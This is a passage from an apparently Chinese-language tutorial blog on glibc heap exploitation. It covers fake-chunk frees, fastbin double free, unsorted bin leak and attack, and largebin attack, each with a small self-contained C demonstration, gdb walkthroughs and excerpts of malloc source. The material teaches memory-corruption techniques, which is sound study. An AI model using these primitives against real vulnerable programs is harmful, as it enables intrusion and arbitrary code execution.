最大的范围的一个数，但要小于 128kb，这样做的目的是在 chunk 连续释放的时候，能够保证伪造的 chunk 在释放后能够挂在 fast bin 中 main_arena 的前面，这样以来我们再一次申请伪造 chunk 大小的块时可以直接重启伪造 chunk。</p></li><li><p>不能构成 double free 的情况</p><p>fake_chunk前一个释放块不能是fake_chunk本身，如果是的话_int_free函数就会检查出来并且中断</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">6</span>] __attribute__ ((aligned(<span class="hljs-number">16</span>)));    <span class="hljs-comment">//对齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>,fck);<br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//该 chunk 的大小</span><br>    fck[<span class="hljs-number">5</span>] = <span class="hljs-number">0x21</span>;   <span class="hljs-comment">//下一个 chunk 的大小</span><br>    <span class="hljs-built_in">free</span> (&amp;fck[<span class="hljs-number">2</span>]);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new malloc addr is %p\n&quot;</span>,<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse.png"></p><p>我们在 gdb 里面走一遍</p><p>首先分配 fake chunk ，我们查看该地址的内存信息（我编译的时候开了保护所以每一次运行的地址不一样）</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb1.png"></p><p>在执行完赋值操作以后就变成了这样</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fasthouse-gdb2.png"></p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>所谓 double free 就是同一个堆被分配两次，其实不仅仅是两次也可以是多次，也就是说被释放的 chunk 在 fast bin 中出现多次。这样之后我们可以从 fast bin 链表中取出同一个堆块，结合堆块的数据内容可以实现类似于类型混淆的效果啦。 同样，因为两次释放的同一个堆块会将指针指向自己，所以我们也可以用来泄露 heap 的地址。</p><p>double free 能够成功的原因主要有两部分：</p><ul><li>fast bin 的堆块被释放以后 next_chunk 的 prev_inuse 位不会被清空</li><li>fast bin 在执行 free 的时候仅仅验证了 main_area 直接指向的块，即链表指针头部的块。</li></ul><p>演示说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr2 addr is %p\n&quot;</span>, ptr2);<br><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    <span class="hljs-comment">// leak heap addr</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ptr2 head addr is %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>]);<br>    <span class="hljs-comment">// alloc to stack</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;  <span class="hljs-comment">// modify chunk size</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble.png"></p><p>我们分别在每一次的 free 和 malloc 处下断点，gdb 中的流程如下：</p><p>第一次 free ptr1，ptr1的地址进入 fast bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble1.png"></p><p>第一次 free ptr2，ptr2 的地址进入 fast bin ，此时 ptr1 的 fd 指针指向 ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble2.png"></p><p>第二次 free ptr1，此时 ptr2 的 fd 指针指向 ptr1，ptr1 的 fd 指针仍然指向 ptr2 </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble3.png"></p><p>第一次 malloc，最后进的 ptr1 被分配出去</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble4.png"></p><p>第二次 malloc， ptr2 被分配出去，但因为因为 ptr2 的 fd 指针指向 ptr1，所以系统仍然认为 ptr1 在 fast bin 中，位置在 ptr2之后（这个图是我们对 ptr1进行了一些 fd 混淆的操作之后截的所以 ptr1 的指针指向 stack）</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble5.png"></p><p>第三次malloc就会把 ” 系统以为仍然在fast bin 里 “ 的 ptr1分配出去。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble6.png"></p><p>最后再一次malloc，就会把我们改写后的地址分配给堆啦</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastdouble7.png"></p><h1 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h1><p>简单回顾一下 unsortedbin 的基本来源和使用情况：</p><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul><li>当一个比较大的 chunk 被分为两个部分之后，如果剩下的部分大于 minsize ，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk ，并且这个 chunk 不和 top chunk 紧邻，这个 chunk 就会被放进 unsorted bin 中</li><li>当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。</li></ul><h3 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h3><p>unsorted bin 采用 FIFO，即先进后出的顺序释放，也就是说从 unsortedbin 中取堆块的时候是从尾部取所以 unsorted bin 使用 bk 指针遍历堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// 防止堆块并入Top chunk中</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p -- %p\n&quot;</span>, ptr1[<span class="hljs-number">0</span>], ptr[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//分别是fd 指针和 bk 指针</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>gdb 中的调试是这样的：</p><p>free 之后的堆结构及内存</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted1.png"></p><p>如果你运行了上面的代码，就会发现 unsorted bin 中只有一个 chunk 时，bin 的 fd 指针和 bk 指针都指向 main_arena 。同样，如果有多个，头部 bin 的 fd 会指向 main_arena 。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted-leak1.png"></p><p><code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址。以 pwntools 为例</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">main_arena_offset = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]</span> + <span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure><p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p><h3 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h3><p>在 _int_malloc 中由一段与 bk 指针有关的代码，当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;   <span class="hljs-comment">//将 unsorted bin 链表的头指针的 bk字段设置为 bck</span><br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><blockquote><p>unsorted_chunks (av) 用于获取 unsortedbin 双向链表头部的指针</p><p>unsorted_chunks (av) 的两个重要元素：</p><p>fd：bin [0]（指向下一块数据，这里指向 unsorted bin 链表的头部）</p><p>bk：bin [1]（指向前一块数据，这里指向 unsorted bin 链表的尾部）</p></blockquote><p>unsorted bin 从尾部依次往前遍历，由于遍历到一个 chunk 就会进行脱链，所以如果要访问到下一个 chunk，只需要访问 <strong>unsorted_chunks (av)-&gt;bk</strong> 就可以了，而且当 bk 内容为 <strong>unsorted_chunks (av)</strong> 则可以说明全部数据已经被遍历，unsortbin 无内容了。</p><p>代码的后两行在做的就是把 victim 中链表中移除。在这个过程中，就利用 <code>bck-&gt;fd = unsorted_chunks (av);</code> 往上面写了一个 <strong>unsorted_chunks (av) 的地址</strong>，这是一个在 libc 上的地址，由 0x7f 开头，是一个很大的数字。</p><p>也就是说我们如果控制了 bck ，那么就可以在脱链的过程中，往 <strong>victim-&gt;bk-&gt;fd</strong> 写入一个很大的数字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target_var = <span class="hljs-number">0</span>;   <span class="hljs-comment">//目标写入的栈</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);   <span class="hljs-comment">//防止与 top chunk 合并</span><br>    <br>    <span class="hljs-built_in">free</span>(p);<br>    p[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);  <span class="hljs-comment">//p 的 bk 指向target_var</span><br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-type">void</span>*)target_var);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体流程如下图</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_bin_attack_order.png"></p><p>初始状态的时候，unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。 </p><p>执行 free(p) ，释放的 chunk 进入 unsortedbin </p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb1.png"></p><p>修改 p[1] 之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb2.png"></p><p>再次申请 chunk，就会从 unsortedbin 中取出，此时 unsortedbin 中的结构变成</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb3.png"></p><p>最后结果如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unsorted_gdb4.png"></p><h1 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h1><blockquote><p>搞这里的时候头昏昏的，先这么放着，待修改😶‍🌫️</p></blockquote><h3 id="largebin-复习"><a href="#largebin-复习" class="headerlink" title="largebin 复习"></a>largebin 复习</h3><p>大于512（1024）字节的 chunk 称为 large chunk，large bin 就是用于管理这些 large chunk </p><p>被释放进 Large Bin 中的 chunk ，除了和其他的 bin 相同的 prev_size、size、fd、bk 这几个结构之外，还具有 fd_nextsize 和 bk_nextsize :</p><ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li></ul><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样可以避免在寻找合适 chunk 时挨个遍历,提高了工作效率。</p><p>排列顺序：</p><ol><li><p>按照大小顺序从小到大排序</p></li><li><p>如果大小相同就按照 free 的先后顺序排序</p></li></ol><p>多个大小相同的堆块，只有首个堆块的 fd_nextsize 和 bk_nextsize 会指向其他堆块，后买你堆块的这两个指针均为0。size 最大的堆块的 bk_nextsize 指向最小的堆块，size 最小的堆块的 fd_nextsize 指向最大的堆块</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);   <span class="hljs-comment">//防止合并，下同</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-built_in">free</span>(p2);<br><br> <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">free</span>(p3);<br><br> p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;    <span class="hljs-comment">//size 设置为 0x3f1</span><br> p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd 置空</span><br> p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd_nextsize 置空</span><br>p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);  <span class="hljs-comment">//bk 修改为 stack_var1_addr - 0x10</span><br>p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);  <span class="hljs-comment">//bk_nextsize 修改为 stack_var1_addr - 0x20</span><br><br> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>第一轮 malloc 结束，堆结构如下，p1、p2、p3 的地址分别是 0x602000 、 0x602360 、 0x6027a0</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb1.png"></p><p>释放掉 p1 和 p2，两个堆块都进入 unsortedbin 中 ，要注意的是，p1 的大小是 0x330 大小属于 small bin，而 p2 的大小是 0x410 属于 large bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb2.png"></p><p>用 <code>malloc(0x90);</code> 分割堆块，所以原本的堆块被分割，剩余的部分进入了 largebin 。</p><p>实际上详细的流程如下：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>所以会出现下图的堆结构：unsorted bin 中有一个 chunk 大小是 0x330 - 0xa0 &#x3D; 0x290 ；large bin 某一个序列的 bin 中有一个 chunk 大小是 0x410</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb3.png"></p><p>free 掉 p3 ，p3 进入 unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb4.png"></p><p>接下来修改 p2 的信息，修改前后依次如下图</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb5.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb6.png"></p><p>修改后的结果如下：</p><table><thead><tr><th>size</th><th>fd</th><th>bk</th><th>fd_nextsize</th><th>bk_nextsize</th></tr></thead><tbody><tr><td>0x3f1</td><td>0</td><td>stack_var1_addr - 0x10</td><td>0</td><td>stack_var2_addr - 0x20</td></tr></tbody></table><p>我们记这个 stack_var1 - 0x10 为 fakechunk1，此时 stack_var1 - 0x10 的 fd 指针指向 fakechunk1 ，同时 stack_var2 - 0x20 为 fakechunke2 ，此时 stack_var2 - 0x20 的 fd 指针指向 fakechunk2。</p><p>接下来我们再次 <code>malloc(0x90)</code>, p3 挂进了 largebin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb7.png"></p><p>具体有关这个部分的 malloc 代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br>        unsorted_chunks (av)-&gt;bk = bck;<br>        bck-&gt;fd = unsorted_chunks (av);<br><br>        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>        <span class="hljs-keyword">if</span> (size == nb)<br>          &#123;<br>            set_inuse_bit_at_offset (victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>              victim-&gt;size |= NON_MAIN_ARENA;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br><br>        <span class="hljs-comment">/* place chunk in bin */</span><br><br>        <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>          &#123;<br>            victim_index = smallbin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            victim_index = largebin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>              &#123;<br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                  &#123;<br>                    fwd = bck;<br>                    bck = bck-&gt;bk;<br><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  &#123;<br>                    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                    